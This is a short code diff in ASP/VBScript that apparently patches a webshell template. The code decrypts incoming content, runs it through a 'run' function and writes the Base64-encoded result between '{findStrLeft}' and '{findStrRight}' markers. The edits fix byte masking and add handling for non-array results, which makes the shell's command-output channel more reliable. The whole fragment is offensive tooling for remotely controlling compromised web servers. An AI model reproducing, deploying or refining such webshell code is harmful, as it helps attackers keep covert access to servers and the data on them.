@@ -22,7 +22,7 @@ Function decryption(content,isBin)
     if IsArray(content) then
         size=UBound(content)+1
         For i=1 To size
-            BinaryStream.WriteText chrw(ascb(midb(content,i,1)))
+            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) And &HFF)
         Next
     end if
     BinaryStream.Position = 0
@@ -48,7 +48,11 @@ End Function
             result=run(content)
             response.Write("{findStrLeft}")
             if not IsEmpty(result) then
-                response.Write Base64Encode(decryption(result,true))
+                if IsArray(result) then
+                    response.Write Base64Encode(decryption(result,true))
+                else
+                    response.Write Base64Encode(result)
+                end if
             end if
             response.Write("{findStrRight}")
         end if
